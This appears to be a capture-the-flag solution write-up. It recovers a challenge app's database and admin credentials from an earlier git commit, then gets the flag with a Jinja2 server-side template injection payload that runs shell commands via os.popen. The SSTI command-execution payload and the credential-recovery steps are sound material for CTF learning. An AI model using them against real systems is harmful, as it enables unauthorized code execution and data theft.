## Solution

### Fork this Repo



```sh
$ git log
commit 974b2e09b19325bde3c35a058f4d537f3f4d848d (HEAD -> master)
Author: Cloud Village <dev@cloud-village.org>
Date:   Mon Mar 25 00:39:54 2024 +0000

    whoops, remove prod credentials

commit 967428759931756b7d7934489d10c93901c8304d (origin/master, origin/HEAD)
Author: Cloud Village <dev@cloud-village.org>
Date:   Sat Mar 23 13:53:13 2024 -0700

    init commit
```

So you can rollback to the first commit that has the checked in credentials that you can use to login to the webapp, as well as the database.
```sh
$ git reset --hard HEAD^
HEAD is now at 09d2695 init commit
$ cat .env
SECRET_KEY=secretkey
DATABASE_PATH=mariadb+pymysql://groot:1crispy2potatos3are4delicious!@127.0.0.1/crispy_potato?charset=utf8mb4
SCRIPT_NAME=/crispy_potato
INIT_USERNAME=CloudVillageCrispyPotatoAdmin
INIT_PASSWORD=000loud1111Village^Crispy?Potato2222Password98765
```

On the site, you can use SSTI in the search box to expose the flag. Here's one string you could provide to it.

```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('mysql -h 127.0.0.1 -ugroot -p1crispy2potatos3are4delicious! crispy_potato -e "SELECT title FROM recipes;"').read()}}
```

![Screenshot](screenshot.png)
